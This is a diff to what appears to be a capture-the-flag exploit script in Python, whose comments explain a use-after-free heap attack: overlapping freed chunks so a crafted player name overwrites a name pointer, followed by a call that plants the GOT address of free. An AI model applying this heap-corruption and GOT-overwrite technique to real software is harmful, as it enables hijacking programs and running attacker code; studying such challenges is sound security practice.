@@ -80,15 +80,16 @@ if __name__ == "__main__":
     raw_input('after removing C...')
 
     # set_name() references the variable 'selected' even after the chunk has gone! (UaF)
-    # -> strcpy(*(char **)(selected + 16), &s);
     #
-    # typedef struct _player_st { _DWORD attack, defense, speed, precision; char * name } player_st;
+    # typedef struct _player_st { _DWORD attack, defense, speed, precision; char * name_ptr } player_st;
     # -> malloc(sizeof(player_st)) -> 24 bytes from LIFO fastbin (previous chunk C-1)
     # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
     # so, 'selected' overlaps with chunk E-2 (player name "EEEEE....")
     # so, (removed) chunk A-1 overlaps with chunk E-2.
-    # so, a carefully crafted name of chunk E will overwrite chunk A-1's name_ptr
+    # so, a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
     # and future set_name() will reference the overwritten pointer.
+    # -> strcpy(*(char **)(selected + 16), &s);
+    # *(select + 16) == 0x603018
 
     add('E'*16 + p64(b.got['free']), 0xfe)
     raw_input('after adding E...')
